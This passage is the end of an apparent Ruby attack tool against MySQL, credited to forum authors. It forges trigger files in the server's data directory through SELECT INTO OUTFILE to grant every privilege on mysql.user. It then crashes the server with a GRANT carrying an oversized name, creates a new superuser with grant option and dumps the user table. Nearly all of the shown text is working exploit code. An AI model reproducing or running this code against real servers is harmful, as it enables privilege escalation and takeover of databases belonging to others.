						@inject = "select 'TYPE=TRIGGERS' into outfile'#{@@datadir}#{@@database}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', Event_priv=\\\\\\'Y\\\\\\', Trigger_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
					end
					@inject2 =
					"SELECT 'TYPE=TRIGGERNAME\\ntrigger_table=rootme;' into outfile '#{@@datadir}#{@@database}/atk.TRN' FIELDS ESCAPED BY ''";
					begin
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						query = @db.query("USE #{@@database};")
					rescue Mysql::Error => e
						puts
						puts "Problem connecting with provided credentials".light_green + "!".white
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
					begin
						query = @db.query("DROP TABLE IF EXISTS rootme;")
						query = @db.query("CREATE TABLE rootme (rootme VARCHAR(256));")
						query = @db.query("#{@inject}")
						query = @db.query("#{@inject2}")
						@a = "A" * 10000;
						query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
					rescue Mysql::Error => e
						puts
						puts "Caused MySQL to spaz".light_green + "!".white
						puts "\t=> #{e}".red
						sleep 3;
						puts
					end #end begin/rescue wrapper
					begin
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						query = @db.query("USE #{@@database};")
						query = @db.query("INSERT INTO rootme VALUES('ROOTED');");
						query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
					rescue Mysql::Error => e
						puts
						puts "Caused MySQL to spaz again".light_green + "!".white
						puts "\t=> #{e}".red
						sleep 3;
						puts
					end #end begin/rescue wrapper
					begin
						@db = Mysql.connect("#{@@host}", "#{@@user}", "#{@@pass}")
						query = @db.query("USE #{@@database};")
						query = @db.query("CREATE USER '#{@@newuser}'\@'%' IDENTIFIED BY '#{@@newuserpass}';")
						query = @db.query("GRANT ALL PRIVILEGES ON *.* TO '#{@@newuser}'\@'%' WITH GRANT OPTION;")
						query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
					rescue Mysql::Error => e
						puts
						puts "Caused MySQL to spaz AGAIN, last time".light_green + "!".white
						puts "\t=> #{e}".red
						sleep 3;
						puts
					end #end begin/rescue wrapper
					begin
						@db = Mysql.connect("#{@@host}", "#{@@newuser}", "#{@@newuserpass}")
						puts
						puts "w00t".light_green + " - ".white + "success".light_green + "!".white
						query = @db.query('SELECT @@hostname;')
						query.each { |x| puts "Hostname: ".light_green + "#{x[0]}".white } 
						query = @db.query('SELECT user();')
						query.each { |x| puts "Loged in as NEW User: ".light_green + "#{x}".white } 
						puts "Using NEW Pass: ".light_green + "#{@@newuserpass}".white
						query = @db.query('SELECT @@version;')
						query.each { |x| puts "MySQL Version: ".light_green + "#{x[0]}".white; @version = "#{x[0]}"; } 
						puts
						puts "Updated MySQL User Table After Exploit".light_green + ": ".white
						query = @db.query("SELECT * FROM mysql.user;")
						query.each { |x| puts "#{x.join(',')}".white }
						puts
						puts "Performing some quick cleanup from exploit process to remove foooooofucker user created by exploit".light_green + ".....".white
						query = @db.query('USE mysql;')
						query = @db.query("DROP USER 'foooooofucker'@'%';")
						query = @db.query('FLUSH PRIVILEGES;')
						puts
						puts "All done, Enjoy".light_green + "!".white
					rescue Mysql::Error => e
						puts
						puts "Problem connecting with NEW USER credentials".light_green + "!".white
						puts "\t=> #{e}".red
						sleep 3;
						puts
						puts "FAIL!".red
						puts
						main_menu
					end #end begin/rescue wrapper
					puts
					main_menu
				else
					foo = Clear.new
					foo.cls
					puts
					puts "Oops, Didn't quite understand that one".light_red + "!".white
					puts "Please Choose a Numbered Option From Below".light_red + ":".white
					puts
					main_menu
				end
			rescue Mysql::Error => e
				puts
				puts "\t=> #{e}".red
				puts
				main_menu
			end #end begin/rescue wrapper for main connection
		end
		##################### END MENU #########################
	end# End class MyEnum

	#Run MyEnum code...
	MyEnum.new	

end#end catch/throw wrapper
# Greetz to ZentrixPlus Forums
# Until next time, Enjoy!
# By: MrGreen & H.R.
#EOF
